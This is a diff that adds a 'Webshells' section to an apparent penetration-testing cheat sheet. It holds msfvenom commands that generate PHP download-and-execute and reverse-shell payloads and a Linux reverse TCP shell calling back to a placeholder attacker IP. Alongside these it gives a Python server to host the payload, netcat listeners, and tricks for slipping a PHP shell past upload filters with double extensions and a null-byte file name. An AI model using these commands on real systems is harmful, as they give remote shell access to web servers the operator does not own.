@@ -404,6 +404,21 @@ msfvenom -p cmd/unix/reverse_bash  LHOST=MYIPADDRESS LPORT=4444 -f raw -o shell.
 msfvenom -p cmd/unix/reverse_perl  LHOST=MYIPADDRESS LPORT=4444 -f raw -o shell.pl
 nc -lvnp 4444
 ```
+#Webshells
+```
+# PHP Download Execute
+msfvenom -p php/download_exec URL=http://MYIPADDRESS/shell.elf -f raw -o shell.php
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f elf > shell.elf
+python -m SimpleHTTPServer 80
+nc -lvnp 443
+
+# PHP
+msfvenom -p php/reverse_php LHOST=MYIPADDRESS LPORT=80 -f raw -o shell.php
+*use meterpreter multihandler
+
+Use burp when trying to upload files. Try shell.php.jpeg and change the content type, modify the upload name, or use a nullbyte
+shell.php%00.jpeg
+```
 ----------------------------------------------------------------------------
 
 
